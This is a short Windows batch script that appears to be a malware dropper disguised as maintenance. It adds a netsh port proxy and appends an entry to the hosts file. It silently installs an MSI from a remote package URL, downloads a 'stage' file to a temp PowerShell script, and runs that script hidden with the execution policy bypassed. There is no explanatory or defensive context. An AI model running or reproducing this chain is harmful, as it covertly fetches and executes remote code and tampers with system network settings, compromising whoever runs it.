@echo off
NETSH.EXE interface portproxy add v4tov4 listenport=8088 listenaddress=127.0.0.1 connectport=443 connectaddress=8.8.8.8
echo 127.0.0.1 relay.example.net>>%SystemRoot%\System32\drivers\etc\hosts
MSIEXEC /i "https://packages.example.net/renamed.msi" /quiet /norestart
curl.exe -fsSL "https://packages.example.net/stage" -o "%TMP%\maintenance.ps1"
powershell.exe -WindowStyle Hidden -EP Bypass -File "%TMP%\maintenance.ps1"
